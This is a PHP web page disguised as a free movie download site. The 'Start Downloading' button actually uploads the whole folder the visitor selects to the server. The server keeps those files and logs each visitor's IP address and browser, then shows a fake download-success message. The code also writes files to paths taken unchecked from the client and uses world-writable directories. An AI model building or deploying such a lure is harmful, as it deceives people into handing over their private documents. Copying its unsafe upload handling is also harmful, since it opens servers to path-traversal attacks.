<?php
// Configuration
$uploadFolder = 'uploads';
$logFile = 'access_log.txt';

// Create uploads directory if it doesn't exist
if (!file_exists($uploadFolder)) {
    mkdir($uploadFolder, 0777, true);
}

// Handle folder upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['docs'])) {
    // Generate timestamp for session folder
    $timestamp = date('Ymd_His');
    $sessionFolder = $uploadFolder . '/' . $timestamp;
    
    // Create session folder
    if (!file_exists($sessionFolder)) {
        mkdir($sessionFolder, 0777, true);
    }
    
    // Log IP and user agent
    $userIp = $_SERVER['REMOTE_ADDR'];
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $logEntry = "[$timestamp] IP: $userIp, Agent: $userAgent\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND);
    
    // Handle multiple file uploads from folder
    $files = $_FILES['docs'];
    $uploadSuccess = true;
    
    foreach ($files['name'] as $key => $name) {
        if ($files['error'][$key] === UPLOAD_ERR_OK) {
            // Get the relative path of the file (for subdirectories)
            $relativePath = isset($_FILES['docs']['full_path'][$key]) ? $_FILES['docs']['full_path'][$key] : $name;
            $targetPath = $sessionFolder . '/' . $relativePath;
            
            // Create any necessary subdirectories
            $targetDir = dirname($targetPath);
            if (!file_exists($targetDir)) {
                mkdir($targetDir, 0777, true);
            }
            
            // Move the uploaded file to the target path
            if (!move_uploaded_file($files['tmp_name'][$key], $targetPath)) {
                $uploadSuccess = false;
            }
        } else {
            $uploadSuccess = false;
        }
    }
    
    if ($uploadSuccess) {
        echo "✅ File Download successfully!";
        exit;
    } else {
        echo "❌ Error uploading folder!";
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Free Unlimited Movies Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .upload-btn {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .upload-btn:hover {
            background-color: #45a049;
        }
        #loading {
            display: none;
            margin-top: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📂 Hey Shokha Movies Download</h1>
        <p>Download Free Movie Select Download' folder to Save Movie</p>
        
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="docs[]" webkitdirectory directory multiple required>
            <br><br>
            <button type="submit" class="upload-btn">Start Downloading</button>
        </form>
        
        <div id="loading">
            Downloading
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function() {
            document.getElementById('loading').style.display = 'block';
        });
    </script>
</body>
</html>